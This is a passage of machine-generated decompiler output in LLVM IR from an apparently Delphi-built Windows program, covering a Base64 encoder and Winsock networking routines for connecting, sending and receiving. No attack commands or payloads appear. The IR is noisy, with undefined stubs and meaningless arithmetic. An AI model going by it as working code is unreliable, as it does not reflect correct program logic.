  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !923
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !924
  ret i32 0, !insn.addr !925
}

define i32 @function_4058c5() local_unnamed_addr {
dec_label_pc_4058c5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !926
  ret i32 %0, !insn.addr !926
}

define i32 @function_4058ca() local_unnamed_addr {
dec_label_pc_4058ca:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !927
}

define i32 @function_4058cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4058cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !928
}

define i32 @function_4058d0() local_unnamed_addr {
dec_label_pc_4058d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !929
  %2 = add i32 %1, -1, !insn.addr !929
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !929
  ret i32 %0, !insn.addr !930
}

define i32 @function_4058db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4058db:
  %storemerge.reg2mem = alloca i32, !insn.addr !931
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !931
  %5 = inttoptr i32 %3 to i32*, !insn.addr !931
  store i32 %4, i32* %5, align 4, !insn.addr !931
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !932
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !932
  %10 = add i8 %7, %9, !insn.addr !932
  %11 = inttoptr i32 %8 to i8*, !insn.addr !932
  store i8 %10, i8* %11, align 1, !insn.addr !932
  %12 = load i32, i32* %eax, align 4, !insn.addr !933
  store i32 %arg1, i32* %eax, align 4, !insn.addr !934
  %13 = add i32 %12, 99, !insn.addr !935
  %14 = inttoptr i32 %13 to i64*, !insn.addr !935
  %15 = load i64, i64* %14, align 4, !insn.addr !935
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !935
  %17 = add i32 %16, -2, !insn.addr !936
  %18 = inttoptr i32 %17 to i16*, !insn.addr !936
  store i16 27241, i16* %18, align 2, !insn.addr !936
  %19 = mul i32 %2, 2, !insn.addr !937
  %20 = add i32 %2, 110, !insn.addr !937
  %21 = add i32 %20, %19, !insn.addr !937
  %22 = inttoptr i32 %21 to i32*, !insn.addr !937
  %23 = load i32, i32* %22, align 4, !insn.addr !937
  %24 = sext i32 %23 to i64, !insn.addr !937
  %25 = mul nsw i64 %24, 111, !insn.addr !937
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !937
  %28 = icmp eq i64 %25, %27, !insn.addr !937
  br i1 %28, label %dec_label_pc_40590d, label %dec_label_pc_40597c, !insn.addr !938

dec_label_pc_40590d:                              ; preds = %dec_label_pc_4058db
  %29 = icmp eq i32 %0, 0, !insn.addr !939
  br i1 %29, label %dec_label_pc_405984, label %dec_label_pc_405911, !insn.addr !940

dec_label_pc_405911:                              ; preds = %dec_label_pc_40590d
  %30 = icmp slt i32 %0, 0, !insn.addr !939
  br i1 %30, label %dec_label_pc_40598c, label %dec_label_pc_405913, !insn.addr !941

dec_label_pc_405913:                              ; preds = %dec_label_pc_405911
  %31 = trunc i32 %0 to i8, !insn.addr !939
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !686, !insn.addr !939
  %33 = and i8 %32, 1, !insn.addr !939
  %34 = icmp eq i8 %33, 0, !insn.addr !939
  br i1 %34, label %dec_label_pc_405945, label %dec_label_pc_405915, !insn.addr !942

dec_label_pc_405915:                              ; preds = %dec_label_pc_405913
  %35 = add i32 %12, -1, !insn.addr !933
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !943
  %37 = load i32, i32* %36, align 4, !insn.addr !943
  %38 = xor i32 %37, %1, !insn.addr !943
  store i32 %38, i32* %36, align 4, !insn.addr !943
  %39 = add i32 %1, 959985462, !insn.addr !944
  %40 = inttoptr i32 %39 to i32*, !insn.addr !944
  %41 = load i32, i32* %40, align 4, !insn.addr !944
  %42 = xor i32 %41, %1, !insn.addr !944
  %43 = add i32 %16, -38, !insn.addr !945
  %44 = inttoptr i32 %43 to i32*, !insn.addr !945
  store i32 %35, i32* %44, align 4, !insn.addr !945
  %45 = add i32 %16, -42, !insn.addr !946
  %46 = inttoptr i32 %45 to i32*, !insn.addr !946
  store i32 %42, i32* %46, align 4, !insn.addr !946
  %47 = add i32 %16, -22, !insn.addr !947
  %48 = inttoptr i32 %47 to i32*, !insn.addr !947
  store i32 0, i32* %48, align 4, !insn.addr !947
  %49 = add i32 %16, -26, !insn.addr !948
  %50 = inttoptr i32 %49 to i32*, !insn.addr !948
  store i32 0, i32* %50, align 4, !insn.addr !948
  %51 = add i32 %16, -30, !insn.addr !949
  %52 = inttoptr i32 %51 to i32*, !insn.addr !949
  store i32 0, i32* %52, align 4, !insn.addr !949
  %53 = add i32 %16, -34, !insn.addr !950
  %54 = inttoptr i32 %53 to i32*, !insn.addr !950
  store i32 0, i32* %54, align 4, !insn.addr !950
  %55 = add i32 %16, -6, !insn.addr !951
  %56 = inttoptr i32 %55 to i32*, !insn.addr !951
  store i32 %arg3, i32* %56, align 4, !insn.addr !951
  %57 = add i32 %16, -46, !insn.addr !952
  %58 = inttoptr i32 %57 to i32*, !insn.addr !952
  store i32 %17, i32* %58, align 4, !insn.addr !952
  ret i32 0, !insn.addr !952

dec_label_pc_405945:                              ; preds = %dec_label_pc_405913
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !953
  %60 = trunc i64 %25 to i32, !insn.addr !937
  %61 = load i32, i32* %eax, align 4, !insn.addr !954
  %62 = add i32 %61, 1, !insn.addr !954
  %63 = mul i32 %59, 8, !insn.addr !955
  %64 = add i32 %59, 48, !insn.addr !955
  %65 = add i32 %64, %63, !insn.addr !955
  %66 = inttoptr i32 %65 to i8*, !insn.addr !955
  %67 = load i8, i8* %66, align 4, !insn.addr !955
  %68 = udiv i32 %62, 256, !insn.addr !955
  %69 = trunc i32 %68 to i8, !insn.addr !955
  %70 = add i8 %67, %69, !insn.addr !955
  store i8 %70, i8* %66, align 4, !insn.addr !955
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !956
  %71 = call i32 @"@LStrClr"(), !insn.addr !957
  %72 = call i32 @function_4034f4(), !insn.addr !958
  %73 = add i32 %60, -8, !insn.addr !959
  %74 = inttoptr i32 %73 to i32*, !insn.addr !959
  store i32 %72, i32* %74, align 4, !insn.addr !959
  %75 = ashr i32 %72, 31, !insn.addr !960
  %76 = zext i32 %72 to i64, !insn.addr !961
  %77 = zext i32 %75 to i64, !insn.addr !961
  %78 = mul i64 %77, 4294967296, !insn.addr !961
  %79 = or i64 %78, %76, !insn.addr !961
  %80 = sdiv i64 %79, 3, !insn.addr !961
  %81 = trunc i64 %80 to i32, !insn.addr !961
  store i32 %81, i32* %eax, align 4, !insn.addr !961
  %82 = srem i64 %79, 3, !insn.addr !961
  %83 = trunc i64 %82 to i32, !insn.addr !961
  %84 = icmp eq i32 %83, 0, !insn.addr !962
  %85 = icmp eq i1 %84, false, !insn.addr !963
  br i1 %85, label %dec_label_pc_40597b, label %dec_label_pc_40596e, !insn.addr !963

dec_label_pc_40596e:                              ; preds = %dec_label_pc_405945
  %86 = load i32, i32* %74, align 4, !insn.addr !964
  %87 = ashr i32 %86, 31, !insn.addr !965
  %88 = zext i32 %86 to i64, !insn.addr !966
  %89 = zext i32 %87 to i64, !insn.addr !966
  %90 = mul i64 %89, 4294967296, !insn.addr !966
  %91 = or i64 %90, %88, !insn.addr !966
  %92 = sdiv i64 %91, 3, !insn.addr !966
  %93 = trunc i64 %92 to i32, !insn.addr !966
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !967
  br label %dec_label_pc_405988, !insn.addr !967

dec_label_pc_40597b:                              ; preds = %dec_label_pc_405945
  ret i32 %81, !insn.addr !967

dec_label_pc_40597c:                              ; preds = %dec_label_pc_4058db
  %94 = load i32, i32* %eax, align 4, !insn.addr !968
  ret i32 %94, !insn.addr !968

dec_label_pc_405984:                              ; preds = %dec_label_pc_40590d
  %95 = load i32, i32* %eax, align 4, !insn.addr !969
  %96 = zext i32 %95 to i64, !insn.addr !969
  %97 = zext i32 %arg3 to i64, !insn.addr !969
  %98 = mul i64 %97, 4294967296, !insn.addr !969
  %99 = or i64 %98, %96, !insn.addr !969
  %100 = zext i32 %arg2 to i64, !insn.addr !969
  %101 = sdiv i64 %99, %100, !insn.addr !969
  %102 = trunc i64 %101 to i32, !insn.addr !969
  %103 = add i32 %102, 1, !insn.addr !970
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !970
  br label %dec_label_pc_405988, !insn.addr !970

dec_label_pc_405988:                              ; preds = %dec_label_pc_40596e, %dec_label_pc_405984
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !971
  ret i32 %104, !insn.addr !972

dec_label_pc_40598c:                              ; preds = %dec_label_pc_405911
  %105 = inttoptr i32 %1 to i32*, !insn.addr !973
  %106 = load i32, i32* %105, align 4, !insn.addr !973
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !973
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !974
  %109 = load i32, i32* %108, align 4, !insn.addr !974
  %110 = add i32 %109, %107, !insn.addr !974
  store i32 %110, i32* %108, align 4, !insn.addr !974
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !975
  %113 = inttoptr i32 %112 to i8*, !insn.addr !975
  %114 = load i8, i8* %113, align 1, !insn.addr !975
  %115 = trunc i32 %111 to i8, !insn.addr !975
  %116 = add i8 %114, %115, !insn.addr !975
  store i8 %116, i8* %113, align 1, !insn.addr !975
  %117 = load i32, i32* %eax, align 4, !insn.addr !976
  ret i32 %117, !insn.addr !976
}

define i32 @function_405994() local_unnamed_addr {
dec_label_pc_405994:
  %ebx.0.reg2mem = alloca i32, !insn.addr !977
  %esp.0.reg2mem = alloca i32, !insn.addr !977
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !978
  %3 = inttoptr i32 %2 to i32*, !insn.addr !978
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !979
  %13 = inttoptr i32 %12 to i32*, !insn.addr !979
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !977
  br label %dec_label_pc_405996, !insn.addr !977

dec_label_pc_405996:                              ; preds = %dec_label_pc_405ae1, %dec_label_pc_405994
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !980
  %25 = add i32 %24, 3, !insn.addr !981
  %26 = load i32, i32* %3, align 4, !insn.addr !978
  %27 = icmp sgt i32 %25, %26, !insn.addr !982
  br i1 %27, label %dec_label_pc_405a36, label %dec_label_pc_4059a7, !insn.addr !982

dec_label_pc_4059a7:                              ; preds = %dec_label_pc_405996
  %28 = add i32 %24, %0, !insn.addr !983
  %29 = inttoptr i32 %28 to i8*, !insn.addr !983
  %30 = load i8, i8* %29, align 1, !insn.addr !983
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !984
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !985
  %34 = inttoptr i32 %33 to i8*, !insn.addr !985
  %35 = load i8, i8* %34, align 1, !insn.addr !985
  store i8 %35, i8* %5, align 1, !insn.addr !986
  %36 = load i8, i8* %29, align 1, !insn.addr !987
  %37 = mul i8 %36, 16, !insn.addr !988
  %38 = and i8 %37, 48, !insn.addr !989
  %39 = add i32 %28, 1, !insn.addr !990
  %40 = inttoptr i32 %39 to i8*, !insn.addr !990
  %41 = load i8, i8* %40, align 1, !insn.addr !990
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !991
  %44 = zext i8 %43 to i32, !insn.addr !991
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !992
  %46 = inttoptr i32 %45 to i8*, !insn.addr !992
  %47 = load i8, i8* %46, align 1, !insn.addr !992
  store i8 %47, i8* %7, align 1, !insn.addr !993
  %48 = load i8, i8* %40, align 1, !insn.addr !994
  %49 = mul i8 %48, 4, !insn.addr !995
  %50 = and i8 %49, 60, !insn.addr !996
  %51 = add i32 %28, 2, !insn.addr !997
  %52 = inttoptr i32 %51 to i8*, !insn.addr !997
  %53 = load i8, i8* %52, align 1, !insn.addr !997
  %54 = udiv i8 %53, 64, !insn.addr !998
  %55 = or i8 %54, %50, !insn.addr !999
  %56 = zext i8 %55 to i32, !insn.addr !999
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1000
  %58 = inttoptr i32 %57 to i8*, !insn.addr !1000
  %59 = load i8, i8* %58, align 1, !insn.addr !1000
  store i8 %59, i8* %9, align 1, !insn.addr !1001
  %60 = and i8 %53, 63, !insn.addr !1002
  %61 = zext i8 %60 to i32, !insn.addr !1002
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1003
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1003
  %64 = load i8, i8* %63, align 1, !insn.addr !1003
  store i8 %64, i8* %11, align 1, !insn.addr !1004
  br label %dec_label_pc_405ae1, !insn.addr !1005

dec_label_pc_405a36:                              ; preds = %dec_label_pc_405996
  %65 = add i32 %24, 2, !insn.addr !1006
  %66 = icmp sgt i32 %65, %26, !insn.addr !1007
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_405aa5, label %dec_label_pc_405a40, !insn.addr !1007

dec_label_pc_405a40:                              ; preds = %dec_label_pc_405a36
  %76 = mul i8 %75, 16, !insn.addr !1008
  %77 = and i8 %76, 48, !insn.addr !1009
  %78 = add i32 %67, 1, !insn.addr !1010
  %79 = inttoptr i32 %78 to i8*, !insn.addr !1010
  %80 = load i8, i8* %79, align 1, !insn.addr !1010
  %81 = zext i8 %80 to i32, !insn.addr !1010
  %82 = udiv i8 %80, 16, !insn.addr !1011
  %83 = or i8 %82, %77, !insn.addr !1012
  %84 = zext i8 %83 to i32, !insn.addr !1012
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1013
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1013
  %87 = load i8, i8* %86, align 1, !insn.addr !1013
  store i8 %87, i8* %7, align 1, !insn.addr !1014
  %88 = mul i32 %81, 4, !insn.addr !1015
  %89 = and i32 %88, 60, !insn.addr !1016
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1017
  %91 = inttoptr i32 %90 to i8*, !insn.addr !1017
  %92 = load i8, i8* %91, align 4, !insn.addr !1017
  store i8 %92, i8* %9, align 1, !insn.addr !1018
  store i8 61, i8* %11, align 1, !insn.addr !1019
  br label %dec_label_pc_405ae1, !insn.addr !1020

dec_label_pc_405aa5:                              ; preds = %dec_label_pc_405a36
  %93 = zext i8 %75 to i32, !insn.addr !1021
  %94 = mul i32 %93, 16, !insn.addr !1022
  %95 = and i32 %94, 48, !insn.addr !1023
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1024
  %97 = inttoptr i32 %96 to i8*, !insn.addr !1024
  %98 = load i8, i8* %97, align 16, !insn.addr !1024
  store i8 %98, i8* %7, align 1, !insn.addr !1025
  store i8 61, i8* %9, align 1, !insn.addr !1026
  store i8 61, i8* %11, align 1, !insn.addr !1027
  br label %dec_label_pc_405ae1, !insn.addr !1027

dec_label_pc_405ae1:                              ; preds = %dec_label_pc_405aa5, %dec_label_pc_405a40, %dec_label_pc_4059a7
  %99 = load i32, i32* %13, align 4, !insn.addr !979
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1028
  %101 = load i32, i32* %100, align 4, !insn.addr !1028
  %102 = add i32 %esp.0.reload, -4, !insn.addr !1028
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1028
  store i32 %101, i32* %103, align 4, !insn.addr !1028
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !1029
  %105 = load i32, i32* %15, align 4, !insn.addr !1030
  %106 = add i32 %esp.0.reload, -8, !insn.addr !1030
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1030
  store i32 %105, i32* %107, align 4, !insn.addr !1030
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !1031
  %109 = load i32, i32* %17, align 4, !insn.addr !1032
  %110 = add i32 %esp.0.reload, -12, !insn.addr !1032
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !1032
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !1033
  %113 = load i32, i32* %19, align 4, !insn.addr !1034
  %114 = add i32 %esp.0.reload, -16, !insn.addr !1034
  %115 = inttoptr i32 %114 to i32*, !insn.addr !1034
  store i32 %113, i32* %115, align 4, !insn.addr !1034
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !1035
  %117 = load i32, i32* %21, align 4, !insn.addr !1036
  %118 = add i32 %esp.0.reload, -20, !insn.addr !1036
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !1036
  %120 = call i32 @"@LStrCatN"(), !insn.addr !1037
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !1038
  %122 = load i32, i32* %23, align 4, !insn.addr !1039
  %123 = add i32 %122, -1, !insn.addr !1039
  %124 = icmp eq i32 %123, 0, !insn.addr !1039
  store i32 %123, i32* %23, align 4, !insn.addr !1039
  %125 = icmp eq i1 %124, false, !insn.addr !1040
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !1040
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !1040
  br i1 %125, label %dec_label_pc_405996, label %dec_label_pc_405b35, !insn.addr !1040

dec_label_pc_405b35:                              ; preds = %dec_label_pc_405ae1
  %126 = load i32, i32* %119, align 4, !insn.addr !1041
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !1042
  store i32 4217687, i32* %111, align 4, !insn.addr !1043
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !1044
  ret i32 %127, !insn.addr !1045
}

define i32 @function_405b50() local_unnamed_addr {
dec_label_pc_405b50:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1046
  ret i32 %0, !insn.addr !1046
}

define i32 @function_405b55() local_unnamed_addr {
dec_label_pc_405b55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1047
}

define i32 @function_405b57(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405b57:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1048
}

define i32 @function_405b60() local_unnamed_addr {
dec_label_pc_405b60:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !1049
  %0 = call i32 @function_4036f4(), !insn.addr !1050
  %1 = inttoptr i32 %0 to i8*, !insn.addr !1051
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !1052
  %3 = call i32 @"@FillChar"(), !insn.addr !1053
  %4 = icmp eq %hostent* %2, null, !insn.addr !1054
  br i1 %4, label %dec_label_pc_405bab, label %dec_label_pc_405b89, !insn.addr !1055

dec_label_pc_405b89:                              ; preds = %dec_label_pc_405b60
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !1052
  %6 = add i32 %5, 12, !insn.addr !1056
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1056
  %8 = load i32, i32* %7, align 4, !insn.addr !1056
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1057
  %10 = load i32, i32* %9, align 4, !insn.addr !1057
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1058
  %12 = load i8, i8* %11, align 1, !insn.addr !1058
  %13 = sext i8 %12 to i32, !insn.addr !1059
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !1060
  br label %dec_label_pc_405bab, !insn.addr !1060

dec_label_pc_405bab:                              ; preds = %dec_label_pc_405b89, %dec_label_pc_405b60
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !1061
}

define i32 @function_405bbc() local_unnamed_addr {
dec_label_pc_405bbc:
  %esp.0.reg2mem = alloca i32, !insn.addr !1062
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !1063
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1064
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !1064
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !1064
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1065
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !1066
  %5 = trunc i32 %4 to i16, !insn.addr !1066
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !1067
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !1068
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !1068
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !1069
  %9 = icmp eq i32 %8, -1, !insn.addr !1070
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1071
  br i1 %9, label %dec_label_pc_405c4a, label %dec_label_pc_405c0b, !insn.addr !1071

dec_label_pc_405c0b:                              ; preds = %dec_label_pc_405bbc
  %10 = call i32 @function_405b60(), !insn.addr !1072
  %11 = trunc i32 %10 to i16, !insn.addr !1073
  %12 = call i16 @htons(i16 %11), !insn.addr !1073
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !1074
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1074
  %14 = sext i16 %12 to i32, !insn.addr !1075
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1075
  %16 = icmp eq i32 %15, 0, !insn.addr !1076
  %17 = icmp eq i1 %16, false, !insn.addr !1077
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1077
  br i1 %17, label %dec_label_pc_405c4a, label %dec_label_pc_405c42, !insn.addr !1077

dec_label_pc_405c42:                              ; preds = %dec_label_pc_405c0b
  %18 = inttoptr i32 %0 to i32*, !insn.addr !1078
  store i32 %8, i32* %18, align 4, !insn.addr !1078
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1079
  br label %dec_label_pc_405c4a, !insn.addr !1079

dec_label_pc_405c4a:                              ; preds = %dec_label_pc_405c42, %dec_label_pc_405c0b, %dec_label_pc_405bbc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1080
  %20 = load i32, i32* %19, align 4, !insn.addr !1080
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !1081
  %21 = add i32 %esp.0.reload, 8, !insn.addr !1082
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1082
  store i32 4217959, i32* %22, align 4, !insn.addr !1082
  %23 = call i32 @"@LStrClr"(), !insn.addr !1083
  ret i32 %23, !insn.addr !1084
}

define i32 @function_405c60() local_unnamed_addr {
dec_label_pc_405c60:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1085
  ret i32 %0, !insn.addr !1085
}

define i32 @function_405c65() local_unnamed_addr {
dec_label_pc_405c65:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1086
}

define i32 @function_405c67(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405c67:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1087
}

define i32 @function_405c70() local_unnamed_addr {
dec_label_pc_405c70:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !1088
  %2 = call i32 @WSACleanup(), !insn.addr !1089
  ret i32 %2, !insn.addr !1090
}

define i32 @function_405c7c() local_unnamed_addr {
dec_label_pc_405c7c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !1091
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1092
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !1092
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !1092
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1093
  %4 = call i32 @function_4036f4(), !insn.addr !1094
  %5 = call i32 @StrCopy(), !insn.addr !1095
  %6 = call i32 @function_407524(i32 4), !insn.addr !1096
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1097
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !1098
  %9 = call i32 @"@LStrClr"(), !insn.addr !1099
  ret i32 %9, !insn.addr !1100
}

define i32 @function_405ced() local_unnamed_addr {
dec_label_pc_405ced:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1101
  ret i32 %0, !insn.addr !1101
}

define i32 @function_405cf2() local_unnamed_addr {
dec_label_pc_405cf2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1102
}

define i32 @function_405cf4(i32 %arg1) local_unnamed_addr {
dec_label_pc_405cf4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1103
}

define i32 @function_405cfc() local_unnamed_addr {
dec_label_pc_405cfc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1104
  %2 = call i32 @StrPas(), !insn.addr !1105
  ret i32 %2, !insn.addr !1106
}

define i32 @function_405d28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405d28:
  %esp.1.reg2mem = alloca i32, !insn.addr !1107
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1107
  %esp.0.reg2mem = alloca i32, !insn.addr !1107
  %ecx.0.reg2mem = alloca i32, !insn.addr !1107
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1108
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !1109
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1109
  br label %dec_label_pc_405d31, !insn.addr !1109

dec_label_pc_405d31:                              ; preds = %dec_label_pc_405d31, %dec_label_pc_405d28
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1110
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1110
  store i32 0, i32* %2, align 4, !insn.addr !1110
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1111
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1111
  store i32 0, i32* %4, align 4, !insn.addr !1111
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1112
  %6 = icmp eq i32 %5, 0, !insn.addr !1112
  %7 = icmp eq i1 %6, false, !insn.addr !1113
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1113
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1113
  br i1 %7, label %dec_label_pc_405d31, label %dec_label_pc_405d38, !insn.addr !1113

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d31
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1114
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1114
  store i32 0, i32* %9, align 4, !insn.addr !1114
  %10 = call i32 @function_4036e4(), !insn.addr !1115
